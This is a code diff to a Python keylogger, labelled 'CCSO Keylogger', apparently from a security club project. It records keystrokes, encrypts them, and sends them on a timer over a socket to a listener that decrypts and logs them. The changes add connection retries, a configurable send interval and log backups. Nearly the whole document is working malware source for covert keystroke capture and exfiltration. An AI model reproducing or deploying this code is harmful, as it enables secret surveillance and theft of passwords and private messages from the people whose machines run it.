@@ -1,10 +1,12 @@
 import argparse
+import os
 import textwrap
 import keyboard
 import sys
 import socket
 import threading
 import zlib
+import time
 import base64
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.PublicKey import RSA
@@ -13,15 +15,14 @@ from io import BytesIO
 from datetime import datetime
 
 # Master TODO
-# Allow the tools to append to the file instead of rewriting
-# Convert write string from b'foo' to foo
+# 1. Implement keyboard interrupt handling
 
 # Classes for good python developer standards :)!
 class Keylogger:
     def __init__(self):
         self.args = args
         self.log = ""
-        self.interval = 5
+        self.interval = self.args.interval
         self.master_log = ""
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -45,11 +46,19 @@ class Keylogger:
         self.log += name
 
     def init_conn(self):
+        conn = False
         # Check if there is already a socket connection, if there is, do nothing
-        try:
-            self.socket.connect((self.args.target, self.args.port))
-        except:
-            print("Error on socket creation")
+        for i in range(0,5):
+            try:
+                self.socket.connect((self.args.target, self.args.port))
+                conn = True
+                break
+            except:
+                print("Error on socket creation")
+                time.sleep(30)
+
+        if conn == False:
+            print("Could not connect to socket, exiting...")
             sys.exit(1)
 
         # TODO listener will reply with the public key, need to make logic to save it
@@ -81,11 +90,6 @@ class Keylogger:
         timer = threading.Timer(interval=self.interval, function=self.send_log)
         timer.start()
 
-    # TODO
-    '''
-    Only listener generates keys client will send a heartbeat to the
-    listener and have the listener send the public key to encrypt with
-    '''
     def generate_keys(self):
         new_key = RSA.generate(2048)
         self.private_key = new_key.exportKey()
@@ -128,26 +132,31 @@ class Keylogger:
 
     # For the listener - handle a received a conncetion
     def handle(self, client_socket):
-        print("[+] Receieved Connection")
-        buf = b""
-        # Receive all the bytes and write them to a file
-        while True:
-            data = client_socket.recv(4096)
-            if data:
-                buf += data
-            else:
-                break
+        # TODO idk if this try except is needed tbh
+        try:
+            print(f"[+] Receieved Connection from {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}")
+            buf = b""
+            # Receive all the bytes and write them to a file
+            while True:
+                data = client_socket.recv(4096)
+                if data:
+                    buf += data
+                else:
+                    break
 
-            # Send public key on initial conection
-            if buf.decode() == "REQ_PUB":
-                client_socket.send(self.public_key)
-                buf=b""
-            else:
-                payload = self.decrypt(buf).decode('UTF-8')
-                with open(self.args.outfile, "a") as f:
-                    f.write(payload)
-                    print(f"[+] Wrote data to {self.args.outfile} @ {datetime.now()}")
-                    buf = b""
+                # Send public key on initial conection
+                if buf.decode() == "REQ_PUB":
+                    client_socket.send(self.public_key)
+                    buf=b""
+                else:
+                    payload = self.decrypt(buf).decode('UTF-8')
+                    with open(self.args.outfile, "a") as f:
+                        f.write(payload)
+                        print(f"[+] Wrote data to {self.args.outfile} @ {datetime.now()}")
+                        buf = b""
+
+        except KeyboardInterrupt:
+            sys.exit(0)
 
     # Create the listener to receive exfiltrated data
     def listen(self):
@@ -165,6 +174,7 @@ class Keylogger:
     # Start the keylogger
     def start(self):
         if self.args.listen:
+            os.rename(self.args.outfile, f"{self.args.outfile}-{datetime.now()}.bak".replace(" ", ""))
             self.listen()
         else:
             # Initialize keylogger
@@ -183,12 +193,11 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
         do this later :)
     '''))
-    parser.add_argument('-c', '--command', action='store_true', help='command shell')
-    parser.add_argument('-e', '--execute', help='execute specified command')
     parser.add_argument('-l', '--listen', action='store_true', help='listen')
     parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
     parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
     parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')
+    parser.add_argument('-i', '--interval', type=int, default=60, help='Interval to send keystrokes')
 
     args = parser.parse_args()
 
